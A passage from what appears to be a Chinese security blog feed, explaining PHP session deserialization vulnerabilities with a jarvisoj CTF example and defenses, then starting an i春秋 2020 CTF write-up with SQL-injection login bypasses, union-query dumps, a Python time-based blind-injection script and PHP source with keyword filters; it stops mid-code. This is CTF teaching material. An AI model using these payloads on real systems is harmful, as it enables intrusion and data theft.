PHP的Session反序列化漏洞原理</h3><p>如果在PHP在反序列化存储的<code>$_SESSION</code>数据时使用的引擎和序列化使用的引擎不一样，会导致数据无法正确地反序列化。如果session值可控，则可通过构造特殊的session值导致反序列化漏洞。</p><p>用原文的一个例子：</p><p><code>session.php</code></p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">ini_set(<span class="string">&#x27;session.serialize_handler&#x27;</span>, <span class="string">&#x27;php_serialize&#x27;</span>);</span><br><span class="line">session_start();</span><br><span class="line">$_SESSION[<span class="string">&quot;spoock&quot;</span>]=$_GET[<span class="string">&quot;a&quot;</span>];</span><br></pre></td></tr></table></figure><p><code>session2.php</code></p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">ini_set(<span class="string">&#x27;session.serialize_handler&#x27;</span>, <span class="string">&#x27;php&#x27;</span>);</span><br><span class="line">session_start();</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">lemon</span> </span>&#123;</span><br><span class="line">    <span class="keyword">var</span> $hi;</span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;hi = <span class="string">&#x27;phpinfo();&#x27;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">         <span class="keyword">eval</span>(<span class="keyword">$this</span>-&gt;hi);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>session.php中的Session是可控的，但是反序列的魔术方法在session2.php中，而session中的参数无法直接可控。</p><p>这个时候，就可以利用两个的php的session存储机制的不同实现session的反序列化攻击。</p><p>具体说：</p><ol><li><p>将payload用session.php，控制存储在指定文件中。</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">session.php?a&#x3D;|O:5:&quot;lemon&quot;:1:&#123;s:2:&quot;hi&quot;;s:14:&quot;echo &quot;spoock&quot;;&quot;;&#125;</span><br></pre></td></tr></table></figure><p>此时传入的数据会按照<strong>php_serialize</strong>来进行序列化，并存储到文件中。</p></li><li><p>再访问session2.php，页面输出<code>spoock</code>,成功执行我们构造的函数。因为在访问session2.php时，程序会按照<strong>php</strong>来反序列化SESSION中的数据（因为同域<code>PHPSESSIONID</code>是一样的，之前存的session也适用），此时就会反序列化伪造的数据，就会实例化lemon对象，最后就会执行析构函数中的eval()方法。</p></li><li><p>可以单步调试一下，更容易理解这两个过程。</p><p><img src="https://i.loli.net/2020/03/11/G4Uh2sDx3grIHL9.png"></p><p><img src="https://i.loli.net/2020/03/11/eUb4csuApvX931V.png"></p></li></ol><h3 id="3-3-更进一步的Session反序列化利用"><a href="#3-3-更进一步的Session反序列化利用" class="headerlink" title="3.3 更进一步的Session反序列化利用"></a>3.3 更进一步的Session反序列化利用</h3><p>上述的利用达到了攻击目的，但是，局限性比较大，我们看一下条件：</p><ol><li>两个文件session引擎配置不同</li><li>其中一个session可控</li><li>两个文件同域</li></ol><p>如何更进一步的利用，或者较少限制的利用Session反序列化呢？</p><p>在<a href="http://www.91ri.org/15925.html">有趣的php反序列化总结</a>中介绍了另一种Session反序列化漏洞的利用方式。</p><p>当PHP中<code>session.upload_progress.enabled</code>打开时，php会记录上传文件的进度，在上传时会将其信息保存在<code>$_SESSION</code>中。<a href="https://bugs.php.net/bug.php?id=71101">phpbugs详情</a>（还有老外的讨论也可以看一下）</p><p>看一下这个漏洞（我为其命名：上传程序Session漏洞）出现的条件：</p><ol><li><code>session.upload_progress.enabled = On</code> (是否启用上传进度报告)</li><li><code>session.upload_progress.cleanup = Off</code> (是否上传完成之后删除session文件)</li></ol><p>符合条件时，上传文件进度的报告就会以写入到session文件中，所以我们可以设置一个与<code>session.upload_progress.name</code>同名的变量(默认名为<code>PHP_SESSION_UPLOAD_PROGRESS</code>)，PHP检测到这种同名请求会在<code>$_SESSION</code>中添加一条数据。我们就可以控制这个数据内容为我们的恶意payload。</p><h3 id="3-4-实例"><a href="#3-4-实例" class="headerlink" title="3.4 实例"></a>3.4 实例</h3><p>用jarvisoj上一个题目作为实例，<a href="http://web.jarvisoj.com:32784/">题目链接</a></p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="comment">//A webshell is wait for you</span></span><br><span class="line">ini_set(<span class="string">&#x27;session.serialize_handler&#x27;</span>, <span class="string">&#x27;php&#x27;</span>);</span><br><span class="line">session_start();</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">OowoO</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> $mdzz;</span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;mdzz = <span class="string">&#x27;phpinfo();&#x27;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">eval</span>(<span class="keyword">$this</span>-&gt;mdzz);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>($_GET[<span class="string">&#x27;phpinfo&#x27;</span>]))</span><br><span class="line">&#123;</span><br><span class="line">    $m = <span class="keyword">new</span> OowoO();</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span></span><br><span class="line">&#123;</span><br><span class="line">    highlight_string(file_get_contents(<span class="string">&#x27;index.php&#x27;</span>));</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>容易发现，<code>OowoO.__destruct()</code>存在代码执行，但是没有可控参数进行利用。</p><p>然后发现符合上传程序Session漏洞的条件：</p><p><img src="https://i.loli.net/2020/03/11/gwD8aRGh4ZBYAxm.png"></p><p>接下来就是如何利用的问题了，我们知道这个漏洞出在上传时的Session存储问题上，所以我们可以利用上传来写入。</p><p>先自己写一个简单的上传页面upload.html：</p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line">&lt;form action=<span class="string">&quot;http://web.jarvisoj.com:32784/index.php&quot;</span> method=<span class="string">&quot;POST&quot;</span> enctype=<span class="string">&quot;multipart/form-data&quot;</span>&gt;</span><br><span class="line">    &lt;input type=<span class="string">&quot;hidden&quot;</span> name=<span class="string">&quot;PHP_SESSION_UPLOAD_PROGRESS&quot;</span> value=<span class="string">&quot;&quot;</span> /&gt;</span><br><span class="line">    &lt;input type=<span class="string">&quot;file&quot;</span> name=<span class="string">&quot;file&quot;</span> /&gt;</span><br><span class="line">    &lt;input type=<span class="string">&quot;submit&quot;</span> /&gt;</span><br><span class="line">&lt;/form&gt;</span><br></pre></td></tr></table></figure><p>poc.php</p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">OowoO</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> $mdzz;</span><br><span class="line">&#125;</span><br><span class="line">$a = <span class="keyword">new</span> OowoO();</span><br><span class="line">$a-&gt;mdzz = <span class="string">&quot;print_r(scandir(__dir__));&quot;</span>;</span><br><span class="line"><span class="keyword">echo</span> serialize($a);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>注意到phpinfo中，禁用了<code>exec,system</code>等函数，注意用<code>print_r</code>绕过。</p><p><img src="https://i.loli.net/2020/03/11/WKjrgSeayOTEUxl.png"></p><p>再从phpinfo中的<code>SCRIPT_FILENAME</code>字段得到根目录地址：<code>/opt/lampp/htdocs/</code>,构造得到payload：</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">O:5:&quot;OowoO&quot;:1:&#123;s:4:&quot;mdzz&quot;;s:88:&quot;print_r(file_get_contents(&#39;&#x2F;opt&#x2F;lampp&#x2F;htdocs&#x2F;Here_1s_7he_fl4g_buT_You_Cannot_see.php&#39;));&quot;;&#125;</span><br></pre></td></tr></table></figure><p><img src="https://i.loli.net/2020/03/11/UnyYaeblrs3HDqQ.png"></p><h2 id="0x04-反序列化的防御"><a href="#0x04-反序列化的防御" class="headerlink" title="0x04 反序列化的防御"></a>0x04 反序列化的防御</h2><p>因为反序列化的缺陷可能导致远程代码执行等严重的攻击，所以我们需要对其进行防护：</p><ol><li>对传入 <code>unserilize()</code> 的参数，进行严格地过滤。</li><li>在文件系统函数的参数可控时，进行严格地过滤。</li><li>严格检查上传文件内容，不能只是单纯地检查文件头（phar）</li><li>条件允许的情况下，禁用可执行系统命令、代码的危险函数。</li><li>注意不同类中的同名方法的编写，避免被用作反序列化的跳板。</li><li>Session方面，一个是多文件间使用一种序列化引擎；二是尽量不要让session可控；三是保持<code>session.upload_progress.cleanup = On</code> (上传完成之后删除session文件)</li></ol><h2 id="0xff-参考链接"><a href="#0xff-参考链接" class="headerlink" title="0xff 参考链接"></a>0xff 参考链接</h2><ol><li><a href="https://www.k0rz3n.com/2018/11/19/%E4%B8%80%E7%AF%87%E6%96%87%E7%AB%A0%E5%B8%A6%E4%BD%A0%E6%B7%B1%E5%85%A5%E7%90%86%E8%A7%A3PHP%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E/">一篇文章带你深入理解漏洞之 PHP 反序列化漏洞</a> 2018,11 k0rn3n</li><li><a href="https://xz.aliyun.com/t/6454">PHP反序列化进阶学习与总结</a>, Threezh1, 先知社区</li><li><a href="https://blog.spoock.com/2016/10/16/php-serialize-problem/">PHP中SESSION反序列化机制</a>, Spoock</li><li><a href="http://www.91ri.org/15925.html">有趣的php反序列化总结</a></li><li><a href="http://llfam.cn/2019/04/01/php%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/#%E9%98%B2%E5%BE%A1%E6%96%B9%E6%B3%95">php反序列化</a> 2019,04 llfam</li></ol>]]></content>
      
      
      <categories>
          
          <category> Web安全 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> php </tag>
            
            <tag> 反序列化 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>i春秋2020 新春公益赛</title>
      <link href="/2020/02/26/ichunqiu2020gys/"/>
      <url>/2020/02/26/ichunqiu2020gys/</url>
      
        <content type="html"><![CDATA[<h1 id="Day1"><a href="#Day1" class="headerlink" title="Day1"></a>Day1</h1><h2 id="web"><a href="#web" class="headerlink" title="web"></a>web</h2><h3 id="简单的招聘系统"><a href="#简单的招聘系统" class="headerlink" title="简单的招聘系统"></a>简单的招聘系统</h3><p>万用密码登录<code>admin</code>用户</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">admin&#39; or 1&#x3D;1#</span><br><span class="line">123qwe</span><br></pre></td></tr></table></figure><p>在<code>blank-page</code>中的<code>search for key</code>处存在SQL注入，联合查询就可以了</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">pages-blank.php?key&#x3D;1&#39; or 1&#x3D;1 order by 5%23</span><br><span class="line">判断存在5个字段</span><br><span class="line"></span><br><span class="line">pages-blank.php?key&#x3D;1&#39; union select 1,2,3,4,5%23</span><br><span class="line">回显在2处</span><br><span class="line"></span><br><span class="line">&#x2F;pages-blank.php?key&#x3D;1&#39; union select 1,group_concat(table_name),3,4,5 from information_schema.tables where table_schema&#x3D;database()%23</span><br><span class="line">表名：backup, flag, user</span><br><span class="line"></span><br><span class="line">pages-blank.php?key&#x3D;1&#39; union select 1,group_concat(column_name),3,4,5 from information_schema.columns where table_schema&#x3D;database() and table_name&#x3D;&#39;flag&#39;%23</span><br><span class="line">列名：id, flaaag</span><br><span class="line"></span><br><span class="line">pages-blank.php?key&#x3D;1&#39; union select 1,flaaag,3,4,5 from flag%23</span><br><span class="line">flag&#123;7e67c965-96e3-4cf4-b3f5-2cdea749bb7d&#125;</span><br></pre></td></tr></table></figure><h3 id="ezupload"><a href="#ezupload" class="headerlink" title="ezupload"></a>ezupload</h3><p>无过滤，直接上传一句话，执行命令即可。白给？</p><p>下载下来研究一下怎么写的:</p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="keyword">if</span> (in_array($ext, [<span class="string">&#x27;php,htaccess,ini,&#x27;</span>])) &#123;</span><br><span class="line">    <span class="keyword">die</span>(<span class="string">&#x27;upload failed&#x27;</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>这个数组写错了，原意大概是<code>if (in_array($ext, [&#39;php&#39;,&#39;htaccess&#39;,&#39;ini&#39;]))</code>然后需要利用<code>phtml</code>绕过。</p><h3 id="盲注"><a href="#盲注" class="headerlink" title="盲注"></a>盲注</h3><p>打开题目得到源码：</p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">    <span class="comment"># flag在fl4g里</span></span><br><span class="line">    <span class="keyword">include</span> <span class="string">&#x27;waf.php&#x27;</span>;</span><br><span class="line">    header(<span class="string">&quot;Content-type: text/html; charset=utf-8&quot;</span>); </span><br><span class="line">    $db = <span class="keyword">new</span> mysql();</span><br><span class="line"></span><br><span class="line">    $id = $_GET[<span class="string">&#x27;id&#x27;</span>];</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> ($id) &#123;</span><br><span class="line">        <span class="keyword">if</span>(check_sql($id))&#123;</span><br><span class="line">            <span class="keyword">exit</span>();</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            $sql = <span class="string">&quot;select * from flllllllag where id=$id&quot;</span>;</span><br><span class="line">            $db-&gt;query($sql);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    highlight_file(<span class="keyword">__FILE__</span>);</span><br></pre></td></tr></table></figure><p>虽然并不知道waf.php的过滤规则，但是很好fuzz，只要被匹配了就会<code>exit()</code>，fuzz发现<code>union</code> <code>select</code> <code>&#39;</code> <code>=</code>等常用关键字被ban了。没有等号可以使用基于<code>regexp</code>的时间盲注，该payload可成功延时:</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">?id&#x3D;-1 or if((substr((fl4g),1,1) regexp &quot;^f&quot;), sleep(5),1)</span><br></pre></td></tr></table></figure><p>所以就写脚本跑就行了：</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> time</span><br><span class="line"><span class="keyword">import</span> datetime</span><br><span class="line"><span class="keyword">from</span> urllib.parse <span class="keyword">import</span> quote</span><br><span class="line"><span class="keyword">import</span> string</span><br><span class="line"></span><br><span class="line">url = <span class="string">&quot;http://a4cbee3d20b542baaedefc971c0798dc808fea8f0de04dd9.changame.ichunqiu.com/?id=-1&quot;</span></span><br><span class="line">words = string.printable[:<span class="number">94</span>]</span><br><span class="line"><span class="comment"># print(words) </span></span><br><span class="line"></span><br><span class="line">target = <span class="string">&#x27;fl4g&#x27;</span></span><br><span class="line">result = <span class="string">&#x27;&#x27;</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range (<span class="number">1</span>,<span class="number">50</span>):</span><br><span class="line"><span class="keyword">for</span> char <span class="keyword">in</span> words:</span><br><span class="line"><span class="comment"># 设置payload</span></span><br><span class="line">payload =<span class="string">&#x27; or if((substr((&#123;&#125;),&#123;&#125;,1) regexp &quot;^&#123;&#125;&quot;),sleep(5),1)&#x27;</span>.format(target, i, char)</span><br><span class="line"><span class="comment"># 计算响应时长</span></span><br><span class="line">start = int(time.time())</span><br><span class="line">r = requests.get(url+quote(payload))</span><br><span class="line">response_time = int(time.time()) - start</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> response_time &gt;= <span class="number">4</span>:</span><br><span class="line">result += char</span><br><span class="line">print(<span class="string">&#x27;flag: &#123;&#125;&#x27;</span>.format(result))</span><br><span class="line"><span class="keyword">break</span></span><br></pre></td></tr></table></figure><h3 id="babyphp"><a href="#babyphp" class="headerlink" title="babyphp"></a>babyphp</h3><p>这道题，一开始没做出来，以为是文件包含，然后死活弄不出来。看了<code>P3rh4ps</code>师傅的<a href="http://p3rh4ps.top/index.php/2020/02/21/820-2-21-i%e6%98%a5%e7%a7%8b%e5%85%ac%e7%9b%8a%e8%b5%9b%e5%87%ba%e9%a2%98%e7%ac%94%e8%ae%b0/">出题笔记</a>，发现思路错了，勉强复现出来。。。大佬牛逼，学到了0rz</p><p>本题主要涉及<strong>php反序列化</strong>和<strong>字符逃逸</strong>，以及<strong>POP链的构造</strong>，关于字符逃逸，我之前也没注意过，找了一篇文章，理解了一下原理——<a href="https://xz.aliyun.com/t/6718">详解PHP反序列化中的字符逃逸</a></p><p>扫描发现<code>www.zip</code>，下载审计。</p><p><code>login.php</code></p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">require_once(&#39;lib.php&#39;);</span><br><span class="line">?&gt;</span><br><span class="line">&lt;meta http-equiv&#x3D;&quot;Content-Type&quot; content&#x3D;&quot;text&#x2F;html; charset&#x3D;utf-8&quot; &#x2F;&gt; </span><br><span class="line">&lt;title&gt;login&lt;&#x2F;title&gt;</span><br><span class="line">&lt;center&gt;</span><br><span class="line">&lt;form action&#x3D;&quot;login.php&quot; method&#x3D;&quot;post&quot; style&#x3D;&quot;margin-top: 300&quot;&gt;</span><br><span class="line">&lt;h2&gt;百万前端的用户信息管理系统&lt;&#x2F;h2&gt;</span><br><span class="line">&lt;h3&gt;半成品系统 留后门的程序员已经跑路&lt;&#x2F;h3&gt;</span><br><span class="line">        &lt;input type&#x3D;&quot;text&quot; name&#x3D;&quot;username&quot; placeholder&#x3D;&quot;UserName&quot; required&gt;</span><br><span class="line">&lt;br&gt;</span><br><span class="line">&lt;input type&#x3D;&quot;password&quot; style&#x3D;&quot;margin-top: 20&quot; name&#x3D;&quot;password&quot; placeholder&#x3D;&quot;password&quot; required&gt;</span><br><span class="line">&lt;br&gt;</span><br><span class="line">&lt;button style&#x3D;&quot;margin-top:20;&quot; type&#x3D;&quot;submit&quot;&gt;登录&lt;&#x2F;button&gt;</span><br><span class="line">&lt;br&gt;</span><br><span class="line">&lt;img src&#x3D;&#39;img&#x2F;1.jpg&#39;&gt;大家记得做好防护&lt;&#x2F;img&gt;</span><br><span class="line">&lt;br&gt;</span><br><span class="line">&lt;br&gt;</span><br><span class="line">&lt;?php </span><br><span class="line">$user&#x3D;new user();</span><br><span class="line">if(isset($_POST[&#39;username&#39;]))&#123;</span><br><span class="line">if(preg_match(&quot;&#x2F;union|select|drop|delete|insert|\#|\%|\&#96;|\@|\\\\&#x2F;i&quot;, $_POST[&#39;username&#39;]))&#123;</span><br><span class="line">die(&quot;&lt;br&gt;Damn you, hacker!&quot;);</span><br><span class="line">&#125;</span><br><span class="line">if(preg_match(&quot;&#x2F;union|select|drop|delete|insert|\#|\%|\&#96;|\@|\\\\&#x2F;i&quot;, $_POST[&#39;password&#39;]))&#123;</span><br><span class="line">die(&quot;Damn you, hacker!&quot;);</span><br><span class="line">&#125;</span><br><span class="line">$user-&gt;login();</span><br><span class="line">&#125;</span><br><span class="line">?&gt;</span><br><span class="line">&lt;&#x2F;form&gt;</span><br><span class="line">&lt;&#x2F;center&gt;</span><br></pre></td></tr></table></figure><p><code>update.php</code></p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">require_once</span>(<span class="string">&#x27;lib.php&#x27;</span>);</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&#x27;&lt;html&gt;</span></span><br><span class="line"><span class="string">&lt;meta charset=&quot;utf-8&quot;&gt;</span></span><br><span class="line"><span class="string">&lt;title&gt;update&lt;/title&gt;</span></span><br><span class="line"><span class="string">&lt;h2&gt;这是一个未完成的页面，上线时建议删除本页面&lt;/h2&gt;</span></span><br><span class="line"><span class="string">&lt;/html&gt;&#x27;</span>;</span><br><span class="line"><span class="keyword">if</span> ($_SESSION[<span class="string">&#x27;login&#x27;</span>]!=<span class="number">1</span>)&#123;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;你还没有登陆呢！&quot;</span>;</span><br><span class="line">&#125;</span><br><span class="line">$users=<span class="keyword">new</span> User();</span><br><span class="line">$users-&gt;update();</span><br><span class="line"><span class="keyword">if</span>($_SESSION[<span class="string">&#x27;login&#x27;</span>]===<span class="number">1</span>)&#123;</span><br><span class="line"><span class="keyword">require_once</span>(<span class="string">&quot;flag.php&quot;</span>);</span><br><span class="line"><span class="keyword">echo</span> $flag;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p><code>index.php</code></p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">require_once</span> <span class="string">&quot;lib.php&quot;</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>($_GET[<span class="string">&#x27;action&#x27;</span>]))&#123;</span><br><span class="line"><span class="keyword">require_once</span>(<span class="keyword">__DIR__</span>.<span class="string">&quot;/&quot;</span>.$_GET[<span class="string">&#x27;action&#x27;</span>].<span class="string">&quot;.php&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span>&#123;</span><br><span class="line"><span class="keyword">if</span>($_SESSION[<span class="string">&#x27;login&#x27;</span>]==<span class="number">1</span>)&#123;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;&lt;script&gt;window.location.href=&#x27;./index.php?action=update&#x27;&lt;/script&gt;&quot;</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span>&#123;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;&lt;script&gt;window.location.href=&#x27;./index.php?action=login&#x27;&lt;/script&gt;&quot;</span>;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p><code>lib.php</code></p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">error_reporting(<span class="number">0</span>);</span><br><span class="line">session_start();</span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">safe</span>(<span class="params">$parm</span>)</span>&#123;</span><br><span class="line">    $array= <span class="keyword">array</span>(<span class="string">&#x27;union&#x27;</span>,<span class="string">&#x27;regexp&#x27;</span>,<span class="string">&#x27;load&#x27;</span>,<span class="string">&#x27;into&#x27;</span>,<span class="string">&#x27;flag&#x27;</span>,<span class="string">&#x27;file&#x27;</span>,<span class="string">&#x27;insert&#x27;</span>,<span class="string">&quot;&#x27;&quot;</span>,<span class="string">&#x27;\\&#x27;</span>,<span class="string">&quot;*&quot;</span>,<span class="string">&quot;alter&quot;</span>);</span><br><span class="line">    <span class="keyword">return</span> str_replace($array,<span class="string">&#x27;hacker&#x27;</span>,$parm);</span><br><span class="line">&#125;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">User</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> $id;</span><br><span class="line">    <span class="keyword">public</span> $age=<span class="literal">null</span>;</span><br><span class="line">    <span class="keyword">public</span> $nickname=<span class="literal">null</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">login</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">        <span class="keyword">if</span>(<span class="keyword">isset</span>($_POST[<span class="string">&#x27;username&#x27;</span>])&amp;&amp;<span class="keyword">isset</span>($_POST[<span class="string">&#x27;password&#x27;</span>]))&#123;</span><br><span class="line">        $mysqli=<span class="keyword">new</span> dbCtrl();</span><br><span class="line">        <span class="keyword">$this</span>-&gt;id=$mysqli-&gt;login(<span class="string">&#x27;select id,password from user where username=?&#x27;</span>);</span><br><span class="line">        <span class="keyword">if</span>(<span class="keyword">$this</span>-&gt;id)&#123;</span><br><span class="line">        $_SESSION[<span class="string">&#x27;id&#x27;</span>]=<span class="keyword">$this</span>-&gt;id;  </span><br><span class="line">        $_SESSION[<span class="string">&#x27;login&#x27;</span>]=<span class="number">1</span>;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;你的ID是&quot;</span>.$_SESSION[<span class="string">&#x27;id&#x27;</span>];</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;你好！&quot;</span>.$_SESSION[<span class="string">&#x27;token&#x27;</span>];</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;&lt;script&gt;window.location.href=&#x27;./update.php&#x27;&lt;/script&gt;&quot;</span>;</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">$this</span>-&gt;id;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">update</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        $Info=unserialize(<span class="keyword">$this</span>-&gt;getNewinfo());</span><br><span class="line">        $age=$Info-&gt;age;</span><br><span class="line">        $nickname=$Info-&gt;nickname;</span><br><span class="line">        $updateAction=<span class="keyword">new</span> UpdateHelper($_SESSION[<span class="string">&#x27;id&#x27;</span>],$Info,<span class="string">&quot;update user SET age=$age,nickname=$nickname where id=&quot;</span>.$_SESSION[<span class="string">&#x27;id&#x27;</span>]);</span><br><span class="line">        <span class="comment">//这个功能还没有写完 先占坑</span></span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">getNewInfo</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        $age=$_POST[<span class="string">&#x27;age&#x27;</span>];</span><br><span class="line">        $nickname=$_POST[<span class="string">&#x27;nickname&#x27;</span>];</span><br><span class="line">        <span class="keyword">return</span> safe(serialize(<span class="keyword">new</span> Info($age,$nickname)));</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">return</span> file_get_contents(<span class="keyword">$this</span>-&gt;nickname);<span class="comment">//危</span></span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__toString</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;nickname-&gt;update(<span class="keyword">$this</span>-&gt;age);</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;0-0&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Info</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> $age;</span><br><span class="line">    <span class="keyword">public</span> $nickname;</span><br><span class="line">    <span class="keyword">public</span> $CtrlCase;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params">$age,$nickname</span>)</span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;age=$age;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;nickname=$nickname;</span><br><span class="line">    &#125;   </span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__call</span>(<span class="params">$name,$argument</span>)</span>&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="keyword">$this</span>-&gt;CtrlCase-&gt;login($argument[<span class="number">0</span>]);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="class"><span class="keyword">Class</span> <span class="title">UpdateHelper</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> $id;</span><br><span class="line">    <span class="keyword">public</span> $newinfo;</span><br><span class="line">    <span class="keyword">public</span> $sql;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params">$newInfo,$sql</span>)</span>&#123;</span><br><span class="line">        $newInfo=unserialize($newInfo);</span><br><span class="line">        $upDate=<span class="keyword">new</span> dbCtrl();</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="keyword">$this</span>-&gt;sql;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">dbCtrl</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> $hostname=<span class="string">&quot;127.0.0.1&quot;</span>;</span><br><span class="line">    <span class="keyword">public</span> $dbuser=<span class="string">&quot;noob123&quot;</span>;</span><br><span class="line">    <span class="keyword">public</span> $dbpass=<span class="string">&quot;noob123&quot;</span>;</span><br><span class="line">    <span class="keyword">public</span> $database=<span class="string">&quot;noob123&quot;</span>;</span><br><span class="line">    <span class="keyword">public</span> $name;</span><br><span class="line">    <span class="keyword">public</span> $password;</span><br><span class="line">    <span class="keyword">public</span> $mysqli;</span><br><span class="line">    <span class="keyword">public</span> $token;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span 